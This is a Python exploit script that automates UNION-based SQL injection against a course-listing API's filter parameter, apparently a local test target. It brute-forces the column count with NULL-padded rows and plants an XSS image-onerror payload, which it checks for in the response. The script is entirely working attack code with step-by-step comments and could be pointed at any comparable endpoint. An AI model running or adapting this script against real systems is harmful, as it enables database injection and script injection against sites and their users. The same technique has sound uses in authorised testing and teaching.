import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "http://localhost:8000/api/v1/courses"
# The payload we want to see in the response
XSS_PAYLOAD = "<img src=x onerror=alert(1)>"

print(f"[*] Starting Smart SQL Injection at: {BASE_URL}")
print("[*] Attempting to auto-discover column count...")

found = False

# Try column counts from 1 to 20
for cols in range(1, 21):
    # 1. Create a list of NULLs
    # We use NULL because it doesn't crash if the column is an Integer or Date
    payload_list = ["NULL"] * cols
    
    # 2. Inject our XSS payload into the 3rd column (Index 2)
    # The Python code showed 'title' is likely the 3rd column.
    if cols >= 3:
        payload_list[2] = f"'{XSS_PAYLOAD}'"
    else:
        # If fewer than 3 columns, just put it in the first one to test
        payload_list[0] = f"'{XSS_PAYLOAD}'"

    # 3. Join them with commas
    injection_string = ", ".join(payload_list)
    
    # 4. Construct the SQL Attack
    # ' breaks out of LIKE
    # UNION SELECT ... adds our row
    # -- comments out the rest
    sql_payload = f"' UNION SELECT {injection_string} --"
    
    try:
        # Send request
        response = requests.get(f"{BASE_URL}", params={'filter': sql_payload}, verify=False)

        # If we get a 200 OK, we guessed the right number of columns!
        if response.status_code == 200:
            print(f"\n[+] MATCH FOUND with {cols} columns!")
            print(f"[+] Status Code: {response.status_code}")
            
            if XSS_PAYLOAD in response.text:
                print("[+] SUCCESS: XSS Payload Reflected.")
                print(f"[+] Working Payload: {sql_payload}")
                found = True
                break
            else:
                print("[-] Database accepted query, but payload not seen in response.")
                print("[-] The visible 'title' column might be at a different index.")
        else:
            # Print a dot for progress
            print(f".", end="", flush=True)

    except Exception as e:
        print(f"[-] Error: {e}")

if not found:
    print("\n[-] Failed to find correct column count. Database might be locked or query is different.")